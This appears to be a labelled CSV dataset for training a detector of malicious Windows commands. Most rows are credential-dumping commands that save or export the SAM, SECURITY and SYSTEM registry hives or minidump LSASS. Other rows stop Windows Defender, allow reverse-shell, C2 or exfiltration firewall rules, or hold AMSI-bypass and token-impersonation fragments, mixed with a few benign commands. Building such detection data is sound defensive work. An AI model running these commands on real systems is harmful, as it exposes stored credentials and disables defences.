text,label
"cmd.exe /c ""reg save hklm\sam c:\temp\m6o4qqg2.dat""",1
reg save hklm\security c:\windows\temp\rfx4cbft.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\lera2qyc.dat""",1
reg save hklm\security c:\windows\temp\1uqe9vgf.save,1
reg export hklm\sam c:\windows\temp\c2pcpok6.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\iy9i6cck.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\sg58j7gl.dat""",1
reg save hklm\system c:\windows\temp\7jin78nc.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\927f08bf.dat""",1
reg export hklm\security c:\windows\temp\8slyc2z0.save,1
reg export hklm\security c:\windows\temp\f8ziiycz.save,1
reg export hklm\security c:\windows\temp\4kuranus.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\8zqx7qab.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\9cft2kdy.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\v9xvvsrb.dat""",1
sc   stop   windefend,2
"cmd.exe /c ""reg export hklm\security c:\temp\njxs6bk9.dat""",1
"cmd.exe /c ""reg export hklm\system c:\windows\temp\944unsr1.save""",1
"cmd.exe /c ""reg export hklm\security c:\temp\n7f3q3b3.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\jjaorn1w.dat""",1
"powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\kpado3hd.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\9t5ckw8d.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\0r5zgetz.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\hsgs8wgv.dat""",1
"cmd.exe /c ""reg   save   hklm\sam   c:\windows\temp\2g9yydd7.save""",1
rule: reverse shell | app: any | dir: outbound | act: allow | port: tcp 8888,2
reg save hklm\system c:\windows\temp\ewrmcqzb.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\ev4q1nym.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\9fwa6q6f.dat""",1
reg export hklm\system c:\windows\temp\ciz3xsww.save,1
rule:  reverse  shell  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888,2
reg save hklm\security c:\windows\temp\v6sgme9q.save,1
reg export hklm\sam c:\windows\temp\vina0euc.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\jc6ub65g.dat""",1
reg save hklm\sam c:\windows\temp\3jxsqbth.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\fp33ujx2.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\0tbtkdbt.dat""",1
"cmd.exe /c ""cmd.exe  /c  ""reg  save  hklm\security  c:\temp\mdodmzfs.dat""""",1
"powershell -nop -c ""cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\1vtqpuao.dat""""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\1d54d9qh.dat""",1
reg save hklm\security c:\windows\temp\nimj45jp.save,1
reg export hklm\sam c:\windows\temp\9bfghhlr.save,1
reg save hklm\sam c:\windows\temp\b7jzrozz.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\lhv4fte0.dat""",1
"powershell -nop -c ""powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\9d1nlzol.dat""""",1
reg save hklm\security c:\windows\temp\nndeezeq.save,1
"cmd.exe /c ""cmd.exe   /c   ""reg   export   hklm\security   c:\temp\nua92ydd.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\wk3lohlc.dat""",1
reg export hklm\security c:\windows\temp\447rv4i8.save,1
reg save hklm\security c:\windows\temp\2mchjoi3.save,1
reg export hklm\security c:\windows\temp\xani12te.save,1
reg save hklm\system c:\windows\temp\30241z27.save,1
reg save hklm\sam c:\windows\temp\67c98grq.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\imhqpxgc.dat""",1
rule:   reverse   shell   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   4444,2
reg save hklm\sam c:\windows\temp\9d4qkl7y.save,1
"cmd.exe /c ""rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full""",1
"powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\iaxgk2y8.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\m70e837y.dat""",1
reg save hklm\system c:\windows\temp\n8bgxb5x.save,1
rule: exfil data | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 4444,2
"cmd.exe /c ""netsh dump > netconfig.txt""",0
"cmd.exe /c ""reg save hklm\sam c:\temp\9oo8irpx.dat""",1
reg export hklm\sam c:\windows\temp\rsksmjyc.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\wwmlycs5.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\w3kszdpv.dat""",1
reg  export  hklm\sam  c:\windows\temp\8o5p717c.save,1
rule: exfil data | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: tcp 8888,2
reg save hklm\system c:\windows\temp\tv18vtxe.save,1
"cmd.exe /c ""reg  save  hklm\system  c:\windows\temp\qqycb70p.save""",1
"powershell -nop -c ""$a  =  [ref].assembly.gettype('system.management.automation.openprocesstoken')""",3
node  server.js  --port  3000,0
"powershell -nop -c ""reg save hklm\security c:\temp\tk2jysw7.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\2udimkr8.dat""",1
reg  save  hklm\system  c:\windows\temp\hntjkuko.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\n2hnvnqv.dat""",1
"cmd.exe /c ""reg   export   hklm\sam   c:\windows\temp\tbs9uew1.save""",1
"cmd.exe /c ""reg export hklm\security c:\temp\p8dv8f7i.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\o7tsw52y.dat""",1
reg save hklm\security c:\windows\temp\4gdadh08.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\74k7fzoe.dat""",1
"cmd.exe /c ""powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\9h3a3v0u.dat""""",1
"cmd.exe  /c  ""reg  export  hklm\security  c:\temp\dp68m7eo.dat""",1
reg save hklm\security c:\windows\temp\idy8gtt9.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\8e99r311.dat""",1
"cmd.exe /c ""reg  export  hklm\security  c:\windows\temp\yuon84rd.save""",1
"powershell -nop -c ""[dllimport(""advapi32.dll"")] extern bool amsiutils(...)""",3
"powershell -nop -c ""powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\uruweg6p.dat""""",1
reg save hklm\system c:\windows\temp\y03tpxmz.save,1
$a = [ref].assembly.gettype('system.management.automation.amsiutils'),3
"cmd.exe /c ""reg save hklm\sam c:\temp\iysnnn5t.dat""",1
"cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\crp4ai6g.dat""",1
"cmd.exe /c ""[dllimport(""advapi32.dll"")]   extern   bool   openprocesstoken(...)""",3
reg save hklm\sam c:\windows\temp\n67bjuk6.save,1
reg save hklm\sam c:\windows\temp\09hp111d.save,1
reg save hklm\security c:\windows\temp\1quqlawx.save,1
"powershell -nop -c ""reg  save  hklm\security  c:\windows\temp\zz78jwud.save""",1
reg export hklm\security c:\windows\temp\4rasw2q5.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\qx41bftu.dat""",1
$a = [ref].assembly.gettype('system.management.automation.duplicatetokenex'),3
"cmd.exe /c ""reg save hklm\security c:\temp\voxzy1u3.dat""",1
"cmd.exe /c ""[dllimport(""advapi32.dll"")]   extern   bool   impersonateloggedonuser(...)""",3
reg save hklm\system c:\windows\temp\5b9ixz3f.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\8p3ejirr.dat""",1
"cmd.exe /c ""reg  save  hklm\security  c:\windows\temp\72o7acqx.save""",1
reg save hklm\sam c:\windows\temp\sotprxve.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\8x7m8961.dat""",1
reg save hklm\security c:\windows\temp\chnnqez4.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\glg1f5od.dat""",1
"powershell -nop -c ""reg  save  hklm\sam  c:\windows\temp\hesrdda6.save""",1
reg save hklm\sam c:\windows\temp\36szb46q.save,1
reg save hklm\sam c:\windows\temp\ppdu1kbn.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\f03pjn3u.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\tewrn3ic.dat""",1
"cmd.exe /c ""powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\nl0vf0ef.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\temp\hz69xd1r.dat""",1
reg export hklm\sam c:\windows\temp\9ff690od.save,1
reg save hklm\security c:\windows\temp\iu2ncu4l.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\tjfy3cja.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\9p8sznjk.dat""",1
reg save hklm\security c:\windows\temp\whw5njb4.save,1
reg save hklm\system c:\windows\temp\lv5vy62s.save,1
reg  save  hklm\security  c:\windows\temp\98je8cti.save,1
reg save hklm\system c:\windows\temp\lwfxibhh.save,1
"powershell -nop -c ""reg   export   hklm\security   c:\windows\temp\90ciqait.save""",1
"powershell -nop -c ""reg   save   hklm\sam   c:\windows\temp\44gb66ml.save""",1
reg save hklm\system c:\windows\temp\9danccpe.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\3rx0i5jg.dat""",1
"cmd.exe /c ""reg   save   hklm\system   c:\windows\temp\6jkzbswh.save""",1
"powershell -nop -c ""reg export hklm\sam c:\windows\temp\sc6a7q8r.save""",1
reg save hklm\system c:\windows\temp\or9m2iq9.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\z1slfsvh.dat""",1
"powershell -nop -c ""powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\s8o7qk1p.dat""""",1
"powershell -nop -c ""reg export hklm\security c:\temp\wxwgey2t.dat""",1
reg export hklm\sam c:\windows\temp\5at610rx.save,1
reg export hklm\system c:\windows\temp\ndd8zsiv.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\ks4vrckl.dat""",1
reg export hklm\system c:\windows\temp\grdfacbn.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\pmimjhka.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\8sl5tnv1.dat""",1
reg save hklm\security c:\windows\temp\16ddw2i3.save,1
"[dllimport(""advapi32.dll"")] extern bool duplicatetokenex(...)",3
"powershell -nop -c ""reg export hklm\security c:\temp\sn6rg44u.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\f7ynyizn.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\8nfeleq8.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\i4v07en5.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\hiyoaw15.dat""",1
reg save hklm\sam c:\windows\temp\uq9ua5w4.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\2daooq33.dat""",1
java  -jar  application.jar,0
"cmd.exe /c ""reg save hklm\sam c:\temp\38ws4vpm.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\5i5ydlcd.dat""",1
"powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\szwfltvz.dat""",1
reg save hklm\system c:\windows\temp\dpklw9nm.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\yjfswj37.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\windows\temp\fl9x80gs.save""",1
sc stop windefend,2
"cmd.exe /c ""reg save hklm\security c:\temp\9qonr3in.dat""",1
reg export hklm\sam c:\windows\temp\ov01pur6.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\to88ccma.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\ibd2pb8c.dat""",1
reg export hklm\sam c:\windows\temp\ui4r1rq3.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\oitksf1g.dat""",1
reg export hklm\system c:\windows\temp\vvn26w1f.save,1
"cmd.exe /c ""sc stop windefend""",2
reg save hklm\sam c:\windows\temp\w0m8qd1o.save,1
reg export hklm\sam c:\windows\temp\sg1cluxy.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\bv1bkk9r.dat""",1
reg export hklm\system c:\windows\temp\xgck47l0.save,1
reg export hklm\security c:\windows\temp\w9j7hzlh.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\hmr02pjt.dat""",1
reg save hklm\security c:\windows\temp\n90c973q.save,1
"powershell -nop -c ""[dllimport(""advapi32.dll"")]   extern   bool   impersonateloggedonuser(...)""",3
"cmd.exe /c ""reg export hklm\security c:\temp\82h8nwzc.dat""",1
reg export hklm\security c:\windows\temp\ub24jb13.save,1
netsh dump > netconfig.txt,0
reg save hklm\security c:\windows\temp\z825fr3x.save,1
reg  export  hklm\sam  c:\windows\temp\898evj5z.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\lmojnlqn.dat""",1
reg export hklm\sam c:\windows\temp\katbyx1s.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\vra197rb.dat""",1
rule:   exfil   data   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888,2
reg save hklm\security c:\windows\temp\815y5vsw.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\77mk8kqe.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\hlncef0j.dat""",1
reg save hklm\sam c:\windows\temp\l17151ub.save,1
reg export hklm\security c:\windows\temp\ux2y8y9u.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\pwa8p10o.dat""",1
reg save hklm\sam c:\windows\temp\5qbo2i5m.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\h9osk1l6.dat""",1
reg save hklm\system c:\windows\temp\raycv1fw.save,1
reg   save   hklm\sam   c:\windows\temp\hvejg6jm.save,1
"powershell -nop -c ""reg save hklm\sam c:\windows\temp\4xdkwips.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\vk21aelj.dat""",1
reg export hklm\system c:\windows\temp\j2foa8al.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\e5px75qx.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\0yem84kg.dat""",1
reg save hklm\security c:\windows\temp\dgh6fnke.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\1loeyrdw.dat""",1
"cmd.exe /c ""rule:   c2   beacon   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
"powershell -nop -c ""reg export hklm\security c:\temp\etnx9quh.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\rw74x6rm.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\a6682zk0.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\bex9r4tg.dat""",1
reg save hklm\sam c:\windows\temp\k550vq6x.save,1
reg save hklm\system c:\windows\temp\llny6a9m.save,1
"powershell -nop -c ""$a  =  [ref].assembly.gettype('system.management.automation.amsiutils')""",3
"powershell -nop -c ""reg export hklm\sam c:\temp\exmi8eev.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\7isneq90.dat""",1
"powershell -nop -c ""select-string   -path   c:\logs\app.log   -pattern   'failed   logon'""",0
reg save hklm\system c:\windows\temp\i1i6a0aw.save,1
reg export hklm\security c:\windows\temp\0pa7ubqk.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\hps1bctm.dat""",1
"powershell -nop -c ""reg  save  hklm\security  c:\windows\temp\ywl80s7d.save""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\3nsv5t8b.dat""",1
reg save hklm\security c:\windows\temp\7oa9r3t8.save,1
reg export hklm\sam c:\windows\temp\b5m3z4ub.save,1
reg save hklm\system c:\windows\temp\hr1m0wjr.save,1
reg export hklm\sam c:\windows\temp\qaoig1a5.save,1
reg export hklm\security c:\windows\temp\kco22198.save,1
"powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\2dk5q2i1.dat""",1
reg export hklm\security c:\windows\temp\z6qj9ddj.save,1
"cmd.exe /c ""reg   save   hklm\sam   c:\windows\temp\vy3igb0n.save""",1
"powershell -nop -c ""cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\10ve3olj.dat""""",1
"powershell -nop -c ""reg export hklm\security c:\temp\35komus9.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\9qizqvsx.dat""",1
reg save hklm\sam c:\windows\temp\hxcj5fnt.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\2be784c3.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\utr2rbfm.dat""",1
"cmd.exe /c ""cmd.exe   /c   ""reg   save   hklm\security   c:\temp\923nfn5v.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\y5y6nnfp.dat""",1
reg export hklm\security c:\windows\temp\knj13kk0.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\kvu7qro0.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\9tu29u2m.dat""",1
"[dllimport(""advapi32.dll"")]   extern   bool   amsiutils(...)",3
reg save hklm\system c:\windows\temp\s5rqlzsi.save,1
reg export hklm\sam c:\windows\temp\qtlacl15.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\jluz95de.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\fvywzfmr.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\9axb4eay.dat""",1
reg save hklm\security c:\windows\temp\lisdx3vv.save,1
reg export hklm\sam c:\windows\temp\c6zggfoc.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\pgvgshyy.dat""",1
"[dllimport(""advapi32.dll"")] extern bool amsiutils(...)",3
reg export hklm\sam c:\windows\temp\y02cfks2.save,1
"powershell -nop -c ""rundll32.exe   c:\windows\system32\comsvcs.dll,   minidump   1234   c:\temp\lsass.dmp   full""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\f0jsmrm9.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\v7du2efw.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\cmdkow1y.dat""",1
reg export hklm\sam c:\windows\temp\q2ayfyfc.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\dqb1jb8p.dat""",1
reg export hklm\sam c:\windows\temp\q9rjdzu7.save,1
reg export hklm\system c:\windows\temp\1k38bowx.save,1
reg export hklm\security c:\windows\temp\6s7rp2d2.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\0m3w32t4.dat""",1
reg   export   hklm\system   c:\windows\temp\923ha8vc.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\3tlo8b56.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\c8dw8uih.dat""",1
reg save hklm\security c:\windows\temp\m6rsdpix.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\cp5x0eiy.dat""",1
reg save hklm\sam c:\windows\temp\kfhoirot.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\iyrkha51.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\88rx22i9.save""",1
rule:  exfil  data  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  1337,2
"cmd.exe /c ""reg export hklm\sam c:\temp\9mtlge3o.dat""",1
$a  =  [ref].assembly.gettype('system.management.automation.amsiutils'),3
reg  export  hklm\system  c:\windows\temp\jepu9g00.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\8u0qx4q9.dat""",1
reg export hklm\security c:\windows\temp\o3h06yg8.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\fgp4dvof.dat""",1
reg save hklm\system c:\windows\temp\roy35hzf.save,1
"powershell -nop -c ""java   -jar   application.jar""",0
reg export hklm\sam c:\windows\temp\uib5sg6n.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\t902yi8j.dat""",1
"powershell -nop -c ""cmd.exe /c ""reg export hklm\security c:\temp\kkova8dj.dat""""",1
"cmd.exe /c ""reg export hklm\security c:\temp\v4w3yyir.dat""",1
reg save hklm\sam c:\windows\temp\75bo750n.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\wbvnm3g6.dat""",1
reg export hklm\sam c:\windows\temp\kh34jq29.save,1
reg save hklm\security c:\windows\temp\962yqb1m.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\mt2s2huw.dat""",1
"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
"cmd.exe /c ""rule:  exfil  data  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
reg save hklm\sam c:\windows\temp\aektp5ze.save,1
"cmd.exe /c ""rule: c2 beacon | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 4444""",2
"cmd.exe /c ""ipconfig /all""",0
node server.js --port 3000,0
reg export hklm\sam c:\windows\temp\n6rjclvr.save,1
reg export hklm\sam c:\windows\temp\b04jtwgv.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\21l9i1yg.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\xqhq4t82.dat""",1
"powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\7l5onzvi.dat""",1
reg export hklm\security c:\windows\temp\gzj9lwrh.save,1
"powershell -nop -c ""rule:  reverse  shell  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
reg export hklm\security c:\windows\temp\s97k2zxj.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\6golbqpq.dat""",1
"powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\j2ia9iz1.dat""",1
"powershell -nop -c ""powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\crifyc9v.dat""""",1
